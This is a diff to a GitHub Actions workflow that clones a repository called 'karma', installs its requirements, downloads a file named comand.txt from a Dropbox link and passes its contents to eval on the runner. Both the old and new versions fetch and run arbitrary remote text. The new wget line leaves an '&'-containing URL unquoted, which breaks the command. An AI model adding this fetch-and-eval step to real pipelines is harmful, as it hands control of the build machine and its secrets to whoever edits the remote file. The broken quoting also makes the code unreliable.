@@ -15,21 +15,17 @@ jobs:
       - name: Install Python
         run: sudo apt-get update && sudo apt-get install python3 -y
 
-      - name: Install Python requirements
+      - name: Install python requirements
         run: sudo apt-get install python3-pip -y
 
-      - name: Clone karma repository
+      - name: Download command from Dropbox
+        run: |
+          wget https://www.dropbox.com/scl/fi/js3qrf4v5yt1ovi5wgz2k/comand.txt?rlkey=9z03izj2eovoicr9i3fuwt1fu&dl=1 -O comand.txt
+
+      - name: Run Shell Script
         run: |
           git clone https://github.com/s4evsa/karma.git
           cd karma
           pip3 install -r requirements.txt
-
-      - name: Download comand.txt from Dropbox
-        run: |
-          wget -O comand.txt "https://www.dropbox.com/scl/fi/js3qrf4v5yt1ovi5wgz2k/comand.txt?rlkey=9z03izj2eovoicr9i3fuwt1fu&st=rgqbt2d7&dl=1"
-      
-      - name: Read and execute command
-        run: |
-          COMMAND=$(cat comand.txt)
-          echo "Executing: $COMMAND"
-          eval "$COMMAND"
+          command=$(cat ../comand.txt)
+          eval "$command"
